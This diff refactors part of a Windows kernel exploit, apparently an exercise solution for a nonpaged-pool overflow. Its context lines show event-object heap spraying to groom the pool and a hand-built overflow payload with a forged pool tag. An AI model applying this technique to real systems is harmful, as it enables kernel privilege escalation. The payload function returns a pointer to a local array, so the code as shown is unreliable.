@@ -18,7 +18,7 @@ NTSTATUS HeapSprayEventObject();
 PBYTE GetNonPagedPoolOverflowPayload();
 VOID CleanEventHandles();
 
-DWORD Solutions::TriggerNonPagedPoolOverflow() {
+NTSTATUS Solutions::TriggerNonPagedPoolOverflow() {
 	PCHAR lpInBuffer = 0;
 	DWORD dwBufLen = OVERFLOW_OFFSET + PAYLOAD_SIZE;
 	DWORD dwBytesReturned = 0;
@@ -58,7 +58,7 @@ DWORD Solutions::TriggerNonPagedPoolOverflow() {
 	return 0;
 }
 
-NTSTATUS HeapSprayEventObject() {
+static NTSTATUS HeapSprayEventObject() {
 	std::cout << "[+] Started derandomizing nonPagedPool" << std::endl;
 	for (int i = 0; i < 10000; i++) {
 		HANDLE tmpEvent = CreateEventA(NULL, FALSE, FALSE, "");
@@ -85,7 +85,7 @@ NTSTATUS HeapSprayEventObject() {
 	return 0;
 }
 
-PBYTE GetNonPagedPoolOverflowPayload() {
+static PBYTE GetNonPagedPoolOverflowPayload() {
 	BYTE payload[] = "\x40\x00\x08\x04" 
 		"\x45\x76\x65\xee" // pool tag
 		"\x00\x00\x00\x00" 
@@ -100,7 +100,7 @@ PBYTE GetNonPagedPoolOverflowPayload() {
 	return payload;
 }
 
-VOID CleanEventHandles() {
+static VOID CleanEventHandles() {
 	for(HANDLE hEvent : first) {
 		CloseHandle(hEvent);
 	}
